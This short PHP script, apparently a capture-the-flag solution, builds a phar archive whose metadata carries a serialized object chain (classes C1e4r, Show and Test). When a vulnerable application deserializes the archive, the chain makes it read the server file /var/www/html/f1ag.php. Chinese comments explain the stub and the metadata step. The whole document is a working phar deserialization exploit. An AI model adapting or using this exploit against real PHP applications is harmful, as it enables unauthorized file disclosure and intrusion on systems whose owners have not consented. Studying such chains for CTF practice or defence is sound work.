<?php
class C1e4r
{
    public $test;
    public $str;
}

class Show
{
    public $source;
    public $str;
}
class Test
{
    public $file;
    public $params;
}

$a = new C1e4r();
$b = new show();
$c = new Test();
$a -> str = $b;
$b -> str['str'] = $c;
$c -> params['source'] = '/var/www/html/f1ag.php';
$phar = new Phar("phar.phar"); //后缀名必须为phar
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER(); ?>"); //设置stub
$phar->setMetadata($a);    //将自定义的$a存入meta-data,最后被反序列化
$phar->addFromString("exp.txt", "test"); //添加要压缩的文件
//签名自动计算
$phar->stopBuffering();
?>